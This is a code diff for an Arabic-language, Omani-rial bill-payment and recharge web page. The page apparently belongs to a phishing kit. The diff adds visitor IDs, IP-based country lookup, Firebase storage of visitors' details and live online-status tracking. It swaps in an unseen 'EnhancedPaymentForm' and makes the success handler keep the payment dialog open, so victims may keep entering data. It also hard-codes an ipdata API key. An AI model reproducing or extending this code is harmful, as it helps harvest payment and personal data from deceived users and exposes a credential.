@@ -1,5 +1,5 @@
 "use client"
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
@@ -8,7 +8,10 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { useForm } from "react-hook-form"
 import { zodResolver } from "@hookform/resolvers/zod"
 import { z } from "zod"
+import { EnhancedPaymentForm } from "@/components/payment-form"
+import { SiteHeader } from "@/components/ui/header"
 import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
 
 // Define the validation schema
 const rechargeSchema = z
@@ -36,79 +39,11 @@ const serviceProviders = [
   { id: "water-main", name: "شركة المياه الرئيسية", type: "telecom" },
 ]
 
-// Site Header Component
-function SiteHeader() {
-  return (
-    <header className="bg-white shadow-sm border-b">
-      <div className="max-w-6xl mx-auto px-4 py-4">
-        <div className="flex items-center justify-between">
-          <div className="text-xl font-bold text-[#00843D]">خدمة الدفع</div>
-          <nav className="hidden md:flex space-x-6 space-x-reverse">
-            <a href="#" className="text-gray-600 hover:text-[#00843D]">
-              الرئيسية
-            </a>
-            <a href="#" className="text-gray-600 hover:text-[#00843D]">
-              الخدمات
-            </a>
-            <a href="#" className="text-gray-600 hover:text-[#00843D]">
-              اتصل بنا
-            </a>
-          </nav>
-        </div>
-      </div>
-    </header>
-  )
+
+function randstr(prefix: string) {
+  return Math.random().toString(36).replace('0.', prefix || '');
 }
-
-// Payment Form Component
-function PaymentForm({
-  handleSubmit,
-  totalAmount,
-  onCancel,
-  violations,
-  onSuccess,
-}: {
-  handleSubmit: () => void
-  totalAmount: number
-  onCancel: () => void
-  violations: any[]
-  onSuccess: () => void
-}) {
-  const [isProcessing, setIsProcessing] = useState(false)
-
-  const processPayment = async () => {
-    setIsProcessing(true)
-    // Simulate payment processing
-    setTimeout(() => {
-      setIsProcessing(false)
-      onSuccess()
-      onCancel()
-    }, 2000)
-  }
-
-  return (
-    <Card className="w-full max-w-md bg-white">
-      <CardContent className="p-6">
-        <h3 className="text-lg font-bold mb-4 text-center">تأكيد الدفع</h3>
-        <div className="space-y-4">
-          <div className="flex justify-between">
-            <span>المبلغ الإجمالي:</span>
-            <span className="font-bold">{totalAmount} ريال عماني</span>
-          </div>
-          <div className="flex space-x-2 space-x-reverse">
-            <Button onClick={processPayment} disabled={isProcessing} className="flex-1 bg-[#00843D] hover:bg-[#006e33]">
-              {isProcessing ? "جاري المعالجة..." : "تأكيد الدفع"}
-            </Button>
-            <Button onClick={onCancel} variant="outline" className="flex-1 bg-transparent" disabled={isProcessing}>
-              إلغاء
-            </Button>
-          </div>
-        </div>
-      </CardContent>
-    </Card>
-  )
-}
-
+const visitorID = randstr('om-')
 
 export default function RechargePage() {
   const {
@@ -139,7 +74,7 @@ export default function RechargePage() {
 
   const onSubmit = async () => {
     try {
-      const visitorId = localStorage.getItem("visitor") || `visitor_${Date.now()}`
+      const visitorId = localStorage.getItem("visitor") || visitorID
       const phoneToStore = getValues().phoneNumber
 
       await addData({
@@ -189,14 +124,36 @@ export default function RechargePage() {
       setFetchingBill(false)
     }
   }
+  async function getLocation() {
+    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
 
+    try {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        id: visitorID,
+        country: country
+      })
+      localStorage.setItem('country', country)
+      setupOnlineStatus(visitorID)
+    } catch (error) {
+      console.error('Error fetching location:', error);
+    }
+  }
+  useEffect(() => {
+    getLocation()
+  }, [])
   return (
     <div className="bg-white min-h-screen font-sans" dir="rtl">
       <SiteHeader />
 
       <main>
         {/* Title Banner */}
-        <div className="bg-[#85a646] text-white text-right py-8 px-4">
+        <div className="bg-[#9aca3f] text-white text-right py-8 px-4">
           <h1 className="text-xl md:text-2xl font-bold">استعراض ودفع الفواتير</h1>
         </div>
 
@@ -204,12 +161,12 @@ export default function RechargePage() {
         <div
           className="py-12 px-4"
           style={{
-            backgroundImage: "url(/bg.jpg) pattern background)",
+            backgroundImage: "url(/bg.jpg) ",
             backgroundRepeat: "repeat",
             backgroundSize: "200px",
           }}
         >
-          <Card className="max-w-md mx-auto bg-white/45 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200 overflow-hidden">
+          <Card className="max-w-md mx-auto bg-backdrop-blur-sm shadow-xl rounded-2xl border-gray-200 overflow-hidden">
             <CardContent className="p-8">
               <form className="space-y-4" onSubmit={handleSubmit(onSubmit)}>
                 <div className="space-y-2">
@@ -253,20 +210,7 @@ export default function RechargePage() {
 
                 <div className="space-y-2">
                   <Label htmlFor="phone-number" className="text-gray-600">
-                    {serviceType === "electricity" ? "رقم العداد " : "ادخل رقم الهاتف الذي تريد تعبئته"}
-                  </Label>
-                  <Input
-                    id="accountNumber"
-                    type="text"
-                    className="bg-white rounded-lg"
-                    dir="ltr"
-                    {...register("accountNumber")}
-                  />
-                  {errors.phoneNumber && <p className="text-red-500 text-sm">{errors.phoneNumber.message}</p>}
-                </div>
-                <div className="space-y-2">
-                  <Label htmlFor="phone-number" className="text-gray-600">
-                    {serviceType === "electricity" ? "رقم الحساب" : "ادخل رقم الهاتف الذي تريد تعبئته"}
+                    {serviceType === "electricity" ? "ادخل رقم الهاتف" : "ادخل رقم الهاتف الذي تريد تعبئته"}
                   </Label>
                   <Input
                     id="phone-number"
@@ -277,7 +221,19 @@ export default function RechargePage() {
                   />
                   {errors.phoneNumber && <p className="text-red-500 text-sm">{errors.phoneNumber.message}</p>}
                 </div>
-
+                <div className="space-y-2">
+                  <Label htmlFor="ac-number" className="text-gray-600">
+                    {serviceType === "electricity" ? "رقم العداد / رقم الحساب" : "ادخل رقم الهاتف الذي تريد تعبئته"}
+                  </Label>
+                  <Input
+                    id="account-number"
+                    type="text"
+                    className="bg-white rounded-lg"
+                    dir="ltr"
+                    {...register("accountNumber")}
+                  />
+                  {errors.phoneNumber && <p className="text-red-500 text-sm">{errors.phoneNumber.message}</p>}
+                </div>
                 {serviceType === "electricity" && (
                   <div className="space-y-2">
                     <Button
@@ -341,14 +297,12 @@ export default function RechargePage() {
 
         {showPayment && (
           <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
-            <PaymentForm
-              handleSubmit={() => {}}
+            <EnhancedPaymentForm
               totalAmount={Number.parseFloat(watch("amount") as any) || 0}
               onCancel={() => setShowPayment(false)}
               violations={selectedViolations}
               onSuccess={() => {
-                alert("تم الدفع بنجاح!")
-                setShowPayment(false)
+                setShowPayment(true)
               }}
             />
           </div>
